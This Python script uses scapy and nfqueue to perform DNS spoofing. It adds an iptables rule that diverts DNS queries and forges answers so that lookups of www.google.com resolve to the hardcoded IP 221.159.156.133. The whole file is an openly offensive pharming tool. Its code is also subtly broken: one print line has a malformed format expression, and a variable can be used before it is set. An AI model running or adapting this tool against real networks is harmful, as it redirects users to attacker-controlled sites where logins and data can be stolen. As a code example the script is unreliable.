from scapy.all import *
import nfqueue
import socket
import os

pharming_target = 'www.google.com'
pharming_site = '221.159.156.133'

def dnsSpoof(dummy, payload):
    data = payload.get_data()
    packet = IP(data)

    dstip = packet[IP].src
    srcip = packet[IP].dst
    dport = packet[UDP].sport
    sport = packet[UDP].dport

    if not packet.haslayer(DNSQR):
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        dnsid = packet[DNS].id
        qd = packet[DNS].qd
        rrname = packet[DNS].qd.name

    if pharming_target in rrname:
        P_IP = IP(dst=dstip, src=srcip)
        P_UDP = UDP(dport=dport, sport=sport)
        dnsrr = DNSRR(rrname=rrname, ttl=10, rdata=pharming_site)
        P_DNS = DNS(id=dnsid, qr=1, aa=1, qd=qd, an=dnsrr)
        spoofPacket = P_IP/P_UDP/P_DNS
        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofPacket),\
            len(spoofPacket))
        print('+DNS SPOOFING [%s] -> [%s]' (%pharming_target, pharming_site))
    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)

def main():
    print('DNS SPOOF START....')
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(dnsSpoof)
    q.create_queue(0)

    try:
        q.try_run()
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        os.system('iptables -F')
        os.system('iptables -X')
        print('\n----RECOVER IPTABLES...')
        return

if __name__ == '__main__':
    main()


